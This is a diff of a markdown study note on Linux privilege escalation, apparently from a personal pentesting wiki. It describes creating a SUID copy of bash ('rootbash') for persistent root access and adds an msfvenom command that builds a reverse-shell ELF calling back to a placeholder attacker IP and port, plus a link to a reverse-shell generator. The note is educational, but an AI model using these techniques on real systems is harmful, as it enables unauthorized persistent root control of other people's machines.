@@ -49,9 +49,9 @@ $ ls -l /bin/date
 #### Spawning Root shell
 
 use the following methods to spawn a root shell in situations where commands can be executed as root-
-##### [[rootbash]] SUID
+##### rootbash SUID
 
-To spawn a root shell, create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set.
+To spawn a root shell, create a copy of the /bin/bash executable file (eg. rename it [[rootbash]]), make sure it is owned by the root user, and has the SUID bit set.
 A root shell can be spawned by simply executing the rootbash file with the -p command line option. The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times)
 
 ##### Custom Executables
@@ -68,6 +68,21 @@ $ gcc -o <name> <filename.c>
 ```
 
 ##### msfvenom
+
+If a reverse shell is preferred, [[msfvenom]] can be used to generate an executable (.elf) file: 
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+This reverse shell can be caught using netcat or Metasploit’s own multi/handler module.
+
+##### Native Reverse Shells
+
+There are multiple ways to spawn [[revshell]] natively on many Linux distributions. A good tool for suggesting these is: https://github.com/mthbernardes/rsg 
+
+
+#### Privilege Escalation Tools
+
+
 
 
 ### References
